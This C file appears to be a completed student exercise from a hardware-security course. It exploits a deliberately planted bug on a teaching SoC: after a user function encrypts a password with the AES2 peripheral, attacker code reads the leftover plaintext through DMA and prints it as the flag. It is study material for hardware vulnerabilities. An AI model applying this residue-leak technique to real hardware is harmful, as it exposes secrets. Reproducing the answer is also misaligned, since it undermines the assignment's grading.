/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - This is the template program file for exploit E1.
//  - Check the Appendix B of assignment manual for more details about the bug and
//    how the exploit is constructed.
//
//  - Command to run this file: ./make_run_user_with_pk.sh exploit1
//
//  - Submit the updated version of this file along with your pdf report.
//  - This report should be executable on the buggy SoC provided to you.
//  - Add comments where ever needed. Your program file will not be evaluated
//    without the comments.
//  - Search for the word 'EDIT' to find all the places where you need to edit
//    this file to complete the exploit
//
/////////////////////////////////////////////////////////////////////////////////////////////////////
//
//  - The flag for exploit 1 is the password used by the user in the user_code
//  function
//
/////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>

#include "ariane_api.h"  // includes all the API functions to access the peripherals


//////////////////////////////////
//
// The user code encrypts the user password using AES2
//
//////////////////////////////////
void user_code(void) {

    uint32_t password[4] = {0x48bea302, 0x3c5098aa, 0x0366fff9, 0x152ae6e3}; // user password
                                                                             // this is the flag

    uint32_t st[4]  = {0xceec63d0, 0xb09ddc81, 0x9705fea6, 0xefef2f0b};  // initial vector for the
                                                                         // AES encryption

    uint32_t ct[AES2_CT_WORDS];  // placeholder to store the encrypted data

    uint32_t key_sel = 0; // can select one of the 3 keys by setting 0, 1 or 2 here
                          // in this case, user is using key 0

    // call AES encryption with key 0
    // AES2 takes 128-bit plain text, 128-bit initial vector, and key number and returns 128-bit encrypted data
    // AES2 encryption function declaration: void aes2_encrypt(uint32_t *pt, uint32_t *st, uint32_t *ct, uint32_t key_sel)
    // The function takes 4 arguments:
    // uint32*pt: a pointer to the plain text. The plain text should be in the form of a array of 4 32 bit-integers
    // uint32*st: a pointer to the initial vector. The initial vector should be in the form of a array of 4 32 bit-integers
    // uint32*ct: a pointer to where the encrypted text should be written. The pointer should point to a array of 4 32 bit-integers
    // uint32_t keys_sel: tells which of the three keys to use for encryption
    aes2_encrypt(password,  st,  ct,  key_sel);

    // printing the encrypted password
    // this printing is just for demonstration purpose.
    // attacker does not have access to this encrypted password.
    printf("encrypted password %08x %08x %08x %08x\n", ct[0], ct[1], ct[2], ct[3]);

    return;
}

//////////////////////////////////
//
// Attacker uses the DMA peripheral to directly read the plain text last used by AES2 peripheral
// which in this case is the password of the user, i.e., the flag
//
//////////////////////////////////
void attacker_code(void) {

    uint64_t rdata[4]; // DMA reads 32 bits at a time but returns them
                       // as 64 bit by extending 32 bit data with 0's
                       // thats why array is 64 bit integers

    uint64_t sAddress = AES2_BASE; //setting data at the base of AES2
    uint32_t length = 4; //number of 32-bit words to transfer


    // read the plain text data from the AES2 peripheral
    // the base address to the registers of AES2 are already provided as AES2_BASE in the header files
    // EDIT: complete the command to copy data from AES2 plain text below
    //      refer to the using_DMA.c C program where we copied data from sha256. it shows how to calculate the
    //      from and to addresses


                                                              // The dma_transfer_from_perif function performs a DMA read from the AES2 peripheral to main memory.
                                                              // sAddress: Source address for the DMA, set to AES2_BASE, the starting address of AES2 plaintext data.
    dma_transfer_from_perif(sAddress, rdata, length, 1);      // rdata: Pointer to the array where read data is stored. AES2 outputs 32-bit data, but DMA extends it to 64 bits in this array.
                                                              // length: Number of 32-bit words to transfer, set to 4 for the 128-bit AES2 data.
                                                              // The final '1' signifies a standard read operation mode for the DMA.
                                                              // This call initiates the DMA transfer, reading the plaintext password from AES2 into the rdata array.

    dma_transfer_from_perif(sAddress, rdata, length, 1);

    printf("Flag = %08x %08x %08x %08x \n", rdata[0], rdata[1], rdata[2], rdata[3]);

    return;
}

//////////////////////////////////
//
// Main function that runs the exploit
//
//////////////////////////////////
void main(void)
{
	printf("Running exploit 1\n");

    //////////////////////////////////
    // Generate a unique ID per student per exploit
    //////////////////////////////////

    char student_name[] = "Daniel Horan" ; // EDIT: replace the string with your first and last names

    print_student_id(student_name, 1);


    //////////////////////////////////
    //  Run the exploit
    //  - The exploit successfully recovers the plain text used in a function
    //    after we exit the function
    //////////////////////////////////

    user_code();  // this is the function run by a normal user doing AES2 encryption
                  // to encrypt his password

    attacker_code(); // this is the function run by an attacker after a user uses AES2 encryption
                     // peripheral to recover the password of the user using B1


    return;
}
